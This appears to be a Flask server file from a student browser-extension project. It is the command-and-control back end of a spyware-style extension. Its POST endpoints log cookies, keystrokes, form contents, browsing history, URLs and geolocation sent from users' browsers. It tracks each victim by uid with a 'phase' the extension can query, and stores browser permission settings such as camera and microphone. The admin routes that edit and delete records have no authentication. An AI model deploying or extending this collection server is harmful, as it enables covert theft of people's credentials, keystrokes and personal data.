

#importing the necessary libraries
import flask 
from flask import Flask, request
from markupsafe import escape
import log
import os
import sqlite3 as sql
#creating an instance of the Flask class 
app = Flask(__name__,
            static_url_path='', 
            static_folder='Control/static',
            template_folder='Control/templates')
#https://stackoverflow.com/questions/20646822/how-to-serve-static-files-in-flask
DB_PATH = __file__[:-6]+"DB\\test.sqlite"

@app.route("/")
def hello_world():
    
    return flask.render_template("1.html")

#restart DB
@app.route("/initialize")
def initialize():
    log.main()
    create_database()
    return "Redoing all"

#Manage CROS error 


#defining a route for the control server 
@app.route('/control_server', methods=['POST'])
def control_server():

    #retrieving data from the request 
    print(request.get_json(force=True))
    #print(request.get_data())
    #processing the data and returning a response 
    #response = {'status': 'success'}
    

    return "thanks"

@app.route("/g", methods=['POST'])
def g():
    log.log("Geo", request.get_data())
    return "Done"
@app.route("/c", methods=['POST'])
def c():
    log.log("Coo", request.get_data())
    return "Done"
@app.route("/f", methods=['POST'])
def f():
    log.log("Form", request.get_data())
    return "Done"
@app.route("/h", methods=['POST'])
def h():
    log.log("His", request.get_data())
    return "Done"
@app.route("/k", methods=['POST'])
def k():
    log.log("Key", request.get_data())
    return "Done"
@app.route("/u", methods=['POST'])
def u():
    log.log("Url", request.get_data())
    return "Done"


@app.route("/req/<int:uid>", methods=['GET'])
def req(uid):
    print(uid)
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    uid = [int(uid)]
    print(uid)
    cur.execute("SELECT phase FROM Users WHERE uid = ?",
                    (uid))
    rows = cur.fetchone()
    conn.close()
    if(rows == None):
        print("Not in Database: ", uid)
        return "False"
    else:
        print(rows)
        rows = rows[0]
        print(rows)
        return str(rows)

    
    
#conda activate servers
#flask --app C:\Users\migue\Documents\TFG\TFGExtension\Server\app run


#https://stackoverflow.com/questions/67429333/flask-how-to-update-information-on-sqlite-based-on-button-input
#DATABASE CONNECTION SYSTEM:



def create_database():
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("""
                CREATE TABLE IF NOT EXISTS Users (
                    uid INTEGER PRIMARY KEY,
                    phase INTEGER
                )                
                """)
    cur.execute("""
                CREATE TABLE IF NOT EXISTS ContentSettings (
                    automaticDownloads TEXT,
                    cookies TEXT,
                    images TEXT,
                    javaScript TEXT,
                    location TEXT,
                    plugins TEXT,
                    popups TEXT,
                    notifications TEXT,
                    fullScreen TEXT,
                    mouseLocks TEXT,
                    microphone TEXT,
                    camera TEXT,
                    unsandboxedPlugins TEXT,
                    csuid INTEGER,
                    FOREIGN KEY(csuid) REFERENCES Users(uid)
                    
                )

                """
    )

    conn.commit()
    
    conn.close()
    
@app.route('/list')
def list():

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("SELECT * FROM  Users")
    rows = cur.fetchall()

    conn.close()

    return flask.render_template("list.html", rows=rows)

@app.route('/listByUid/<int:uid>')
def list2(uid):

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("""
    SELECT * FROM  Users u RIGHT JOIN ContentSettings c WHERE u.uid = c.csuid
    """)
    rows = cur.fetchall()
    print(rows)
    conn.close()

    return flask.render_template("list_copy.html", rows=rows)


@app.route('/edit/<int:number>', methods=['GET', 'POST'])
def edit(number):

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    if request.method == 'POST':
        item_uid    = number
        item_phase = request.form['phase']
    
        cur.execute("UPDATE Users SET phase = ? WHERE uid = ?",
                    (item_phase, item_uid))
        conn.commit()
        
        return flask.redirect('/list') 
        
    cur.execute("SELECT * FROM Users WHERE uid = ?", (number,))
    item = cur.fetchone()
    
    conn.close()

    return flask.render_template("edit.html", item=item)


@app.route('/delete/<int:number>')
def delete(number):

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
        
    cur.execute("DELETE FROM Users WHERE uid = ?", (number,))

    conn.commit()
    
    conn.close()

    return flask.redirect('/list') 

@app.route('/add', methods=['GET', 'POST'])
def add():

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    if request.method == 'POST':
        item_uid    = request.form['uid']
        item_phase = request.form['phase']

        
        cur.execute("""INSERT INTO Users (uid, phase) VALUES (?, ?)""", 
                    (item_uid, item_phase))
        conn.commit()
        
        return flask.redirect('/list') 
        
    return flask.render_template("add.html")


@app.route("/extadd/<int:number>", methods=['POST'])
def extadd(number):
    '''
    This is the route for adding elements to the database for the extions
    the int number determines which Table to send the information
    The information is processed in the log.py module.
    '''

    if (number == 1):
        data = request.get_json(force=True)
        print(data)
        log.CSDBlog(data)
        pass
    else:
        if request.method == 'POST':
            conn = sql.connect(DB_PATH)
            cur = conn.cursor()
            item_uid    = int(request.get_json(force=True)["uid"][0])
            print(item_uid)
            item_phase = 0
            #https://stackoverflow.com/questions/19337029/insert-if-not-exists-statement-in-sqlite
            cur.execute("""INSERT OR IGNORE INTO Users (uid, phase) VALUES (?, ?)""", 
                        (item_uid, item_phase))
            conn.commit()
        
    return "good day"


